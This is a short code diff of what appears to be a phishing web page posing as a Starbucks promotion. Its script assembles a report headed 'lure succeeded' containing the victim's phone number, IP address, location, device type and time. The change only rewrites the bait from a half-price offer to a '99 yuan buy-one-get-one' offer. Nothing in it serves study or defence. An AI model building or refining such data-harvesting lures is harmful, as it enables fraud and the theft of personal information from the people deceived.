@@ -81,7 +81,7 @@ button:active{transform:scale(0.98)}
         const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
         const device = navigator.userAgent.includes("iPhone") ? "iPhone" : navigator.userAgent.includes("Android") ? "Android手機" : "電腦";
 
-        const msg = `2025星巴克指定品項半價誘捕成功\n\n` +
+        const msg = `2025星巴克99元買一送一誘捕成功\n\n` +
                     `電話：${code}${phone}\n` +
                     `IP　　：${ipData.ip}\n` +
                     `位置　：${ipData.city || "未知"}，${ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知"}\n` +
@@ -99,3 +99,4 @@ button:active{transform:scale(0.98)}
 
 </body>
 </html>
+
